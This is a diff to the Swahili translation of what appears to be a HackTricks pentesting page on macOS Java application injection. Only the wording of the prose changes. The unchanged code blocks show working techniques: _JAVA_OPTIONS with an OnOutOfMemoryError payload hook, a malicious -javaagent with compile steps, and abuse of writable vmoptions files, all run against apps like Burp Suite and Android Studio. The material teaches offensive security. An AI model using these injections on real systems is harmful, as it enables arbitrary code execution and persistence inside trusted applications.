@@ -1,10 +1,10 @@
-# macOS Java Applications Injection
+# Java Applications Injection kwenye macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Enumeration
 
-Pata programu za Java zilizowekwa kwenye mfumo wako. Iligundulika kwamba programu za Java katika **Info.plist** zitakuwa na baadhi ya vigezo vya java ambavyo vina mfuatano wa herufi **`java.`**, hivyo unaweza kutafuta hilo:
+Tafuta Java applications zilizosakinishwa kwenye mfumo wako. Imegunduliwa kuwa Java apps kwenye **Info.plist** zitakuwa na baadhi ya java parameters zilizo na string **`java.`**, hivyo unaweza kuitafuta:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Kigezo cha env **`_JAVA_OPTIONS`** kinaweza kutumika kuingiza vigezo vya java vya kiholela katika utekelezaji wa programu iliyotengenezwa kwa java:
+Kigezo cha mazingira **`_JAVA_OPTIONS`** kinaweza kutumiwa kuingiza parameta za java za kiholela wakati wa kutekeleza app iliyocompileiwa kwa java:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Ili kuitekeleza kama mchakato mpya na si kama mtoto wa terminal ya sasa unaweza kutumia:
+Ili kuiendesha kama mchakato mpya na si kama mtoto wa terminal ya sasa unaweza kutumia:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Hata hivyo, hiyo itasababisha kosa kwenye programu iliyotekelezwa, njia nyingine ya siri ni kuunda wakala wa java na kutumia:
+Hata hivyo, hilo litasababisha error kwenye app inayotekelezwa; njia nyingine ya stealth zaidi ni kuunda java agent na kutumia:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Kuunda wakala kwa **toleo tofauti la Java** kutoka kwa programu kunaweza kusababisha kuanguka kwa utekelezaji wa wakala na programu zote mbili
+> Kuunda agent kwa **Java version tofauti** na ile ya application kunaweza kusababisha execution ya agent na application zote mbili ku-crash
 
-Mahali ambapo wakala anaweza kuwa:
+Ambapo agent inaweza kuwa:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,19 +102,19 @@ err.printStackTrace();
 }
 }
 ```
-Ili kukusanya wakala, endesha:
+Ili ku-compile agent, endesha:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-Na `manifest.txt`:
+Kwa kutumia `manifest.txt`:
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Na kisha peleka variable ya env na uendeshe programu ya java kama:
+Kisha export env variable na uendeshe java application kama ifuatavyo:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptions file
 
-Fail hii inasaidia kufafanua **Java params** wakati Java inatekelezwa. Unaweza kutumia baadhi ya hila za awali kubadilisha java params na **kufanya mchakato utekeleze amri zisizo na mipaka**.\
-Zaidi ya hayo, faili hii pia inaweza **kujumuisha nyingine** na saraka ya `include`, hivyo unaweza pia kubadilisha faili iliyojumuishwa.
+Faili hii inaunga mkono uainishaji wa **Java params** wakati Java inatekelezwa. Unaweza kutumia baadhi ya mbinu za awali kubadilisha Java params na **kuufanya mchakato utekeleze amri kiholela**.\
+Zaidi ya hayo, faili hii inaweza pia **kujumuisha nyingine** kwa kutumia directory ya `include`, hivyo unaweza pia kubadilisha faili iliyojumuishwa.
 
-Zaidi ya hayo, baadhi ya programu za Java zitakuwa **zinaweza kupakia zaidi ya moja `vmoptions`** faili.
+Zaidi ya hapo, baadhi ya Java apps **zitapakia zaidi ya faili moja ya `vmoptions`**.
 
-Baadhi ya programu kama Android Studio zinaonyesha katika **matokeo yao ambapo wanatafuta** faili hizi, kama:
+Baadhi ya applications kama Android Studio huonyesha katika **output mahali zinapotafuta** faili hizi, kama vile:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Baadhi ya programu kama Android Studio zinaonyesha katika **matokeo yao ambapo w
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Ikiwa hawafanyi hivyo, unaweza kuangalia kwa urahisi kwa:
+Ikiwa hazifanyi hivyo, unaweza kuikagua kwa urahisi kwa:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Kumbuka jinsi ilivyo ya kuvutia kwamba Android Studio katika mfano huu inajaribu kupakia faili **`/Applications/Android Studio.app.vmoptions`**, mahali ambapo mtumiaji yeyote kutoka kwenye **`admin` group ana ruhusa ya kuandika.** 
+Kumbuka jinsi inavyovutia kwamba Android Studio katika mfano huu inajaribu kupakia faili **`/Applications/Android Studio.app.vmoptions`**, mahali ambapo mtumiaji yeyote kutoka kwenye **`admin` group ana ruhusa ya kuandika.**
 
 {{#include ../../../banners/hacktricks-training.md}}
